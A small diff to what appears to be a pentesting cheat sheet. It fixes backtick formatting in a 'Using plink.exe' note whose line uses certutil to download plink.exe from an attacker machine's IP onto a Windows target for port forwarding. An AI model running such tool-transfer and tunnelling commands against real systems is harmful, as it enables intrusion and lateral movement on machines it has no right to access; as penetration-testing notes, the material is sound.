@@ -93,7 +93,7 @@
 
 #### Using plink.exe
 
-* **Bring file over to target machine in Windows:** `certutil --urlcache -f http://<`attack machine's IP>/plink.exe
+* **Bring file over to target machine in Windows:** `certutil --urlcache -f http://<attack machine's IP>/plink.exe`
 * find a folder with wright priv. /tmp is good
 * use plink for port forwarding 
 
